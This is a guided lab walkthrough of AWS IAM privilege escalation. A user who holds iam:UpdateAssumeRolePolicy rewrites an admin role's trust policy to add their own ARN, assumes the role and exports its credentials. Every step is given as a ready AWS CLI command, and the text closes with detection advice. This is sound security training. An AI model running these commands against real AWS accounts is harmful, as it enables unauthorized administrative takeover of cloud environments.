# Guided Walkthrough: Privilege Escalation via iam:UpdateAssumeRolePolicy

This scenario demonstrates a powerful privilege escalation vulnerability where a user with `iam:UpdateAssumeRolePolicy` permission can modify the trust policy (AssumeRole policy) of a privileged role to grant themselves access. Trust policies control who can assume a role — by modifying this policy, an attacker can inject their own principal as a trusted entity, then immediately assume the role to gain its elevated permissions.

This attack is particularly dangerous because trust policies are often overlooked in security reviews. Organizations may carefully audit identity-based policies attached to roles but forget that trust policies are equally critical for access control. A user with `iam:UpdateAssumeRolePolicy` permission on an admin role can effectively grant themselves admin access in just two API calls.

The scenario creates a user with permission to update the trust policy of an admin role that initially trusts only the EC2 service. The attacker modifies the trust policy to add their own user as a trusted principal, then assumes the role to gain full administrative access.

## The Challenge

You have credentials for `pl-prod-iam-012-to-admin-starting-user`. This user has been granted `iam:UpdateAssumeRolePolicy` and `sts:AssumeRole` on `pl-prod-iam-012-to-admin-target-role` — an IAM role with `AdministratorAccess`.

The catch: the role's trust policy currently only allows the EC2 service to assume it. You cannot assume it directly yet. Your goal is to change that.

## Reconnaissance

First, confirm who you are and what account you're operating in:

```bash
aws sts get-caller-identity
```

Now take a look at the target role's current trust policy. This tells you who is currently allowed to assume it:

```bash
aws iam get-role \
  --role-name pl-prod-iam-012-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument' \
  --output json
```

You'll see the trust policy allows only `ec2.amazonaws.com` as a principal. That means no IAM user or role — including you — can assume it today. But you have `iam:UpdateAssumeRolePolicy`. That's about to change.

Confirm your attempt to assume the role is blocked before you make any changes:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-admin-target-role \
  --role-session-name test-session
```

You should get an error — `is not authorized to assume role`. Good. Now you know the starting state.

## Exploitation

Grab your full user ARN — you'll need it to craft the new trust policy:

```bash
aws sts get-caller-identity --query 'Arn' --output text
```

Now build a new trust policy document that adds your user as a trusted principal and apply it to the target role:

```bash
aws iam update-assume-role-policy \
  --role-name pl-prod-iam-012-to-admin-target-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "<your_user_arn>"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }'
```

IAM changes take a moment to propagate through AWS infrastructure. Wait about 15 seconds before proceeding:

```bash
sleep 15
```

Now assume the role:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-admin-target-role \
  --role-session-name admin-escalation-session \
  --output json
```

Export the returned credentials into your shell environment:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from output>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from output>"
export AWS_SESSION_TOKEN="<SessionToken from output>"
```

## Verification

Confirm the new identity reflects the assumed role:

```bash
aws sts get-caller-identity
```

The `Arn` in the response should show `assumed-role/pl-prod-iam-012-to-admin-target-role/admin-escalation-session`. Now verify the role's administrative access:

```bash
aws iam list-users --max-items 3 --output table
```

If you can list IAM users, you have `AdministratorAccess`. Privilege escalation is complete.

## What Happened

You started as a low-privilege IAM user with a very specific — and dangerous — permission: the ability to edit who can assume an administrative role. By rewriting the role's trust policy to include your own user ARN, you unlocked the door that was already in front of you. A single call to `sts:AssumeRole` was all it took to walk through.

This attack requires only two API calls (`iam:UpdateAssumeRolePolicy` and `sts:AssumeRole`) and leaves a clear audit trail in CloudTrail. In real environments it often appears in CI/CD service accounts or infrastructure automation roles that have been granted broad IAM permissions. A CSPM tool scanning for privilege escalation paths should flag any principal that holds `iam:UpdateAssumeRolePolicy` on a role with elevated permissions as a critical finding.
